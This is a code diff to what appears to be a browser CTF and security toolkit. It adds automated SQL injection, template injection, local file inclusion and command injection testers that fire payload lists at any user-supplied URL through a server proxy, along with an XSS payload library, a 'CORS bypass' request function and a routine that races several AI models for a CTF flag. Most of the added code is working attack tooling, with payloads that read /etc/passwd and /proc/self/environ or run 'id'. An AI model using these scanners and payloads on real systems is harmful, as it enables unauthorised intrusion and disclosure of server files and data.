@@ -563,6 +563,281 @@ function webSqliTest(){
   document.getElementById('web-sqli-output').value=out+'\n[!] Manual testing required on actual endpoint';
 }
 
+// Live SQLi attack via /api/webfetch proxy
+async function webSqliAttack(){
+  const inp=document.getElementById('web-sqli-input').value.trim();
+  if(!inp){showToast('Enter config JSON','warn');return}
+  let config;
+  try{config=JSON.parse(inp)}catch{showToast('Invalid JSON','error');return}
+  const url=config.url;
+  const param=config.param;
+  if(!url||!param){showToast('Need url and param in JSON','warn');return}
+
+  const out=document.getElementById('web-sqli-output');
+  out.value='Running live SQLi attack via /api/webfetch...\n\n';
+
+  // Baseline request
+  let baseline='';
+  try{
+    const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,method:'GET',timeout:10000})});
+    const d=await r.json();
+    baseline=d.body||'';
+    out.value+=`[BASELINE] Status: ${d.status}, Length: ${baseline.length}\n\n`;
+  }catch(e){
+    out.value+='[BASELINE ERROR] '+e.message+'\n\n';
+  }
+
+  // Test payloads
+  const payloads=[
+    {name:'OR 1=1',value:`' OR '1'='1`},
+    {name:'OR 1=1 comment',value:`' OR 1=1--`},
+    {name:'UNION 1,2,3',value:`' UNION SELECT 1,2,3--`},
+    {name:'UNION NULL',value:`' UNION SELECT NULL,NULL,NULL--`},
+    {name:'Time delay',value:`' OR SLEEP(3)--`},
+    {name:'Error based',value:`' AND 1=CONVERT(int,(SELECT @@version))--`},
+    {name:'Boolean true',value:`' AND 1=1--`},
+    {name:'Boolean false',value:`' AND 1=2--`},
+  ];
+
+  for(const p of payloads){
+    try{
+      const sep=url.includes('?')?'&':'?';
+      const testUrl=`${url}${sep}${param}=${encodeURIComponent(p.value)}`;
+      const start=Date.now();
+      const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:testUrl,method:'GET',timeout:10000})});
+      const d=await r.json();
+      const elapsed=Date.now()-start;
+      const len=(d.body||'').length;
+      const diff=baseline?Math.abs(len-baseline.length):0;
+      let verdict='no change';
+      if(baseline&&len!==baseline.length) verdict=`DIFFERENT (${diff} bytes)`;
+      if(p.name.includes('Time')&&elapsed>=2500) verdict='POSSIBLE (slow response)';
+      out.value+=`[${p.name}] status=${d.status||'err'} len=${len} time=${elapsed}ms → ${verdict}\n`;
+      if(d.body&&d.body.length<500){
+        const snippet=d.body.substring(0,200).replace(/\n/g,' ');
+        out.value+=`    Body: ${snippet}${d.body.length>200?'...':''}\n`;
+      }
+    }catch(e){
+      out.value+=`[${p.name}] ERROR: ${e.message}\n`;
+    }
+  }
+  out.value+='\n[Done] Check which payloads caused different responses.';
+}
+
+// SSTI (Server-Side Template Injection) tester
+async function webSstiTest(){
+  const url=document.getElementById('web-ssti-input').value.trim();
+  if(!url){showToast('Enter target URL','warn');return}
+  const out=document.getElementById('web-ssti-output');
+  out.value='Testing SSTI payloads via /api/webfetch...\n\n';
+
+  let baseline='';
+  try{
+    const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,method:'GET',timeout:10000})});
+    const d=await r.json();
+    baseline=d.body||'';
+    out.value+=`[BASELINE] Status: ${d.status}, Length: ${baseline.length}\n\n`;
+  }catch(e){
+    out.value+='[BASELINE ERROR] '+e.message+'\n\n';
+  }
+
+  const payloads=[
+    {name:'Jinja2/Twig math',val:'{{7*7}}',expect:'49'},
+    {name:'Jinja2 string',val:'{{7*\'7\'}}',expect:'7777777'},
+    {name:'Freemarker',val:'${7*7}',expect:'49'},
+    {name:'Smarty',val:'{php}echo `id`;{/php}',expect:null},
+    {name:'ERB (Ruby)',val:'#{7*7}',expect:'49'},
+    {name:'Tornado',val:'{{7*7}}',expect:'49'},
+    {name:'Mako',val:'${7*7}',expect:'49'},
+    {name:'Velocity',val:'#set($x=7*7)$x',expect:'49'},
+  ];
+
+  for(const p of payloads){
+    try{
+      const sep=url.includes('?')?'&':'?';
+      const testUrl=`${url}${sep}${encodeURIComponent(p.val)}`;
+      const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:testUrl,method:'GET',timeout:10000})});
+      const d=await r.json();
+      const body=d.body||'';
+      const len=body.length;
+      const diff=baseline?Math.abs(len-baseline.length):0;
+      let verdict='no match';
+      if(p.expect&&body.includes(p.expect)) verdict='VULNERABLE! ('+p.expect+' found)';
+      else if(baseline&&len!==baseline.length) verdict=`response length changed (${diff} bytes)`;
+      out.value+=`[${p.name}] val="${p.val}" → ${verdict}\n`;
+    }catch(e){
+      out.value+=`[${p.name}] ERROR: ${e.message}\n`;
+    }
+  }
+  out.value+='\n[Done] If "VULNERABLE" appears, the server evaluates template syntax.';
+}
+
+// LFI (Local File Inclusion) tester
+async function webLfiTest(){
+  const url=document.getElementById('web-lfi-input').value.trim();
+  if(!url){showToast('Enter target URL','warn');return}
+  const out=document.getElementById('web-lfi-output');
+  out.value='Testing LFI payloads via /api/webfetch...\n\n';
+
+  let baseline='';
+  try{
+    const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,method:'GET',timeout:10000})});
+    const d=await r.json();
+    baseline=d.body||'';
+    out.value+=`[BASELINE] Status: ${d.status}, Length: ${baseline.length}\n\n`;
+  }catch(e){
+    out.value+='[BASELINE ERROR] '+e.message+'\n\n';
+  }
+
+  const payloads=[
+    '../../../etc/passwd',
+    '../../../../etc/passwd',
+    '../../../../../etc/passwd',
+    '..\\..\\..\\windows\\win.ini',
+    '..\\..\\..\\..\\windows\\win.ini',
+    '/etc/passwd',
+    'C:\\windows\\win.ini',
+    'php://filter/convert.base64-encode/resource=index.php',
+    'php://filter/read=convert.base64-encode/resource=index',
+    'file:///etc/passwd',
+    '....//....//....//etc/passwd',
+    '..%2F..%2F..%2Fetc%2Fpasswd',
+    '..%252f..%252f..%252fetc%252fpasswd',
+    '/proc/self/environ',
+    '/proc/self/cmdline',
+  ];
+
+  for(const payload of payloads){
+    try{
+      const sep=url.includes('?')?'&':'?';
+      const testUrl=`${url}${sep}file=${encodeURIComponent(payload)}`;
+      const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:testUrl,method:'GET',timeout:10000})});
+      const d=await r.json();
+      const body=d.body||'';
+      const len=body.length;
+      const diff=baseline?Math.abs(len-baseline.length):0;
+      let verdict='no change';
+      if(baseline&&len!==baseline.length) verdict=`DIFFERENT (${diff} bytes)`;
+      if(body.includes('root:')||body.includes('[fonts]')||body.includes('DOCUMENT_ROOT')||body.includes('<?php')) verdict='POSSIBLE LFI!';
+      out.value+=`[${payload.substring(0,40)}...] → ${verdict}\n`;
+      if(verdict.includes('POSSIBLE')) out.value+=`    Sample: ${body.substring(0,150).replace(/\n/g,' ')}...\n`;
+    }catch(e){
+      out.value+=`[${payload.substring(0,40)}...] ERROR: ${e.message}\n`;
+    }
+  }
+  out.value+='\n[Done] LFI indicators: /etc/passwd contains "root:", win.ini contains "[fonts]".';
+}
+
+// XSS Payload Generator
+function webXssGen(){
+  const context=document.getElementById('web-xss-input').value.trim()||'html';
+  const payloads=[
+    {ctx:'html',p:'<script>alert(1)</script>'},
+    {ctx:'html',p:'<img src=x onerror=alert(1)>'},
+    {ctx:'html',p:'<svg/onload=alert(1)>'},
+    {ctx:'html',p:'<body onload=alert(1)>'},
+    {ctx:'html',p:'<iframe src="javascript:alert(1)">'},
+    {ctx:'html',p:'<input autofocus onfocus=alert(1)>'},
+    {ctx:'html',p:'"><script>alert(1)</script>'},
+    {ctx:'html',p:'\'><script>alert(1)</script>'},
+    {ctx:'html',p:'</script><script>alert(1)</script>'},
+    {ctx:'html',p:'<details open ontoggle=alert(1)>'},
+    {ctx:'html',p:'<marquee onstart=alert(1)>'},
+    {ctx:'html',p:'javascript:alert(1)'},
+    {ctx:'html',p:'data:text/html,<script>alert(1)</script>'},
+    {ctx:'attr',p:'\" onmouseover=\"alert(1)\"'},
+    {ctx:'attr',p:'\" autofocus onfocus=\"alert(1)\" x=\"'},
+    {ctx:'js',p:'\\\';alert(1);//'},
+    {ctx:'js',p:'</script><script>alert(1)</script>'},
+    {ctx:'js',p:'alert(1)//'},
+    {ctx:'url',p:'javascript:alert(1)'},
+    {ctx:'url',p:'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='},
+    {ctx:'css',p:'expression(alert(1))'},
+    {ctx:'css',p:'-moz-binding:url("javascript:alert(1)")'},
+  ];
+  let out='XSS Payload Library\nContext: '+context+'\n\n';
+  const filtered=context==='all'?payloads:payloads.filter(p=>p.ctx===context);
+  filtered.forEach((p,i)=>out+=`${i+1}. [${p.ctx}] ${p.p}\n`);
+  out+='\n[!] Use these in security tests on systems you own or have explicit permission to test.';
+  document.getElementById('web-xss-output').value=out;
+}
+
+// Command Injection tester
+async function webCmdiTest(){
+  const url=document.getElementById('web-cmdi-input').value.trim();
+  if(!url){showToast('Enter target URL','warn');return}
+  const out=document.getElementById('web-cmdi-output');
+  out.value='Testing command injection via /api/webfetch...\n\n';
+
+  let baseline='';
+  try{
+    const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,method:'GET',timeout:10000})});
+    const d=await r.json();
+    baseline=d.body||'';
+    out.value+=`[BASELINE] Status: ${d.status}, Length: ${baseline.length}\n\n`;
+  }catch(e){
+    out.value+='[BASELINE ERROR] '+e.message+'\n\n';
+  }
+
+  const payloads=[
+    {name:'semicolon',val:'; id'},
+    {name:'pipe',val:'| id'},
+    {name:'double-amp',val:'&& id'},
+    {name:'subshell',val:';$(id)'},
+    {name:'backticks',val:'`id`'},
+    {name:'newline',val:'%0aid'},
+    {name:'ampersand',val:'& id'},
+  ];
+
+  for(const p of payloads){
+    try{
+      const sep=url.includes('?')?'&':'?';
+      const testUrl=`${url}${sep}host=127.0.0.1${encodeURIComponent(p.val)}`;
+      const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:testUrl,method:'GET',timeout:10000})});
+      const d=await r.json();
+      const body=d.body||'';
+      const len=body.length;
+      const diff=baseline?Math.abs(len-baseline.length):0;
+      let verdict='no change';
+      if(baseline&&len!==baseline.length) verdict=`DIFFERENT (${diff} bytes)`;
+      if(body.includes('uid=')||body.includes('root')||body.includes('Windows')) verdict='POSSIBLE CMDi!';
+      out.value+=`[${p.name}] "${p.val}" → ${verdict}\n`;
+      if(verdict.includes('POSSIBLE')) out.value+=`    Sample: ${body.substring(0,200).replace(/\n/g,' ')}...\n`;
+    }catch(e){
+      out.value+=`[${p.name}] ERROR: ${e.message}\n`;
+    }
+  }
+  out.value+='\n[Done] Indicators: "uid=" means id command ran, "root" in body, file paths, etc.';
+}
+
+// Custom request (CORS bypass)
+async function webCustomFetch(method){
+  const inp=document.getElementById('web-fetch-input').value.trim();
+  if(!inp){showToast('Enter request JSON','warn');return}
+  let config;
+  try{config=JSON.parse(inp)}catch{showToast('Invalid JSON','error');return}
+  config.method=method;
+  const out=document.getElementById('web-fetch-output');
+  out.value=`Sending ${method} to ${config.url}...\n\n`;
+  try{
+    const r=await fetch('/api/webfetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(config)});
+    const d=await r.json();
+    if(d.success){
+      out.value=`[${method} ${config.url}] Status: ${d.status} (${d.time}ms)\n\n`;
+      out.value+='HEADERS:\n';
+      for(const[k,v]of Object.entries(d.headers||{})){
+        out.value+=`  ${k}: ${v}\n`;
+      }
+      out.value+='\nBODY:\n'+d.body;
+      if(d.truncated) out.value+='\n\n[Response truncated at 1MB]';
+    }else{
+      out.value+='ERROR: '+(d.error||'unknown');
+    }
+  }catch(e){
+    out.value+='NETWORK ERROR: '+e.message;
+  }
+}
+
 // =============================================
 // Forensics Tools
 // =============================================
@@ -2171,6 +2446,24 @@ async function decodePastedData(){
   solveRenderLog();
   solveLogMsg('✅ Decode complete','','success');
   solveRenderLog();
+}
+
+// =============================================
+// Multi-Model Race (parallel AI providers, first to find flag wins)
+// Inspired by verialabs/ctf-agent's multi-model racing approach
+// =============================================
+async function raceModels(problem,providers){
+  // Try all providers in parallel, return first successful response
+  const results=await Promise.allSettled(providers.map(p=>p.fn(p.key||'',problem)));
+  const successes=results.filter(r=>r.status==='fulfilled'&&r.value).map(r=>r.value);
+  if(successes.length===0){
+    const errors=results.map((r,i)=>`${providers[i].name}: ${r.status==='rejected'?r.reason?.message||'failed':'no response'}`).join(' | ');
+    throw new Error('All race participants failed: '+errors);
+  }
+  // Prefer response that contains a flag
+  const flagRegex=/(flag|CTF|picoCTF|HTB)\{[^}]+\}/i;
+  const flagged=successes.find(s=>flagRegex.test(s));
+  return flagged||successes[0];
 }
 
 async function autoAISolve(){
